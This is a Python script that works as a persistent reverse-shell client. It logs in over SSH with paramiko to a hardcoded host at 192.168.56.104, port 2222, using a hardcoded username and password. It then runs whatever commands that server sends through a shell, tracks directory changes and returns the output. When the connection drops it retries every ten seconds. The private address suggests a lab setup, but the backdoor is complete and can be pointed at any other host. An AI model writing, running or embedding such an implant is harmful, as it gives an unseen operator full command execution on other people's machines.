#!/usr/bin/env python3
import time
import subprocess
import paramiko
from pathlib import Path

IP = '192.168.56.104'
PORT = 2222
USERNAME = 'trid'
PASSWORD = '5731'

current_dir = Path(__file__).parent

def execute_command(command):
    '''function to execute commands from server'''
    global current_dir
    try:
        cmd_output = subprocess.check_output(command, shell=True, cwd=str(current_dir), stderr=subprocess.STDOUT)
        if not cmd_output:
            cmd_output = 'okay\n'.encode('utf-8')
        decoded = cmd_output.decode('utf-8', errors='ignore').strip()
        return f'{decoded}\n'.encode('utf-8')
    except subprocess.CalledProcessError as e:
        err_output = e.output.decode('utf-8', errors='ignore').strip()
        return f'{err_output}\n'.encode('utf-8') if err_output else f'Command retured error code: {e.returncode}\n'.encode('utf-8')
    except Exception as e:
        return f'Execute error: {e}\n'.encode('utf-8')

def start_client():
    global current_dir
    while True:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(hostname=IP, port=PORT, username=USERNAME, password=PASSWORD)

            transport = client.get_transport()
            assert transport is not None
            chan = transport.open_session()

            print('[+] Waiting for commands...')
            while True:
                chan.send(str(current_dir).encode('utf-8'))
                command = chan.recv(1024).decode('utf-8')

                if not command:
                    break

                command = command.strip()

                if command == 'empty_input':
                    continue

                if command.lower() == 'exit':
                    break

                if command.startswith('cd'):
                    try:
                        path_arg = command[3:].strip().strip("'\"")
                        if not path_arg:
                            target_path = Path.home()
                        else:
                            target_path = Path(current_dir / path_arg).resolve()

                        if target_path.exists() and target_path.is_dir():
                            current_dir = target_path
                            cmd_result = b'\n'
                        else:
                            cmd_result = f'Error: The system cannot find path specified: {path_arg}\n'.encode('utf-8')
                    except Exception as e:
                        cmd_result = f'Error: {e}\n'.encode('utf-8')
                    
                    chan.send(cmd_result)
                    continue

                if command == 'keep_alive':
                    continue

                cmd_result = execute_command(command)
                chan.send(cmd_result)
            chan.close()
        except Exception:
            print('[-] Connection failed. Reconecting in 10 seconds...')
            time.sleep(10)
        finally:
            client.close()

if __name__ == '__main__':
    start_client()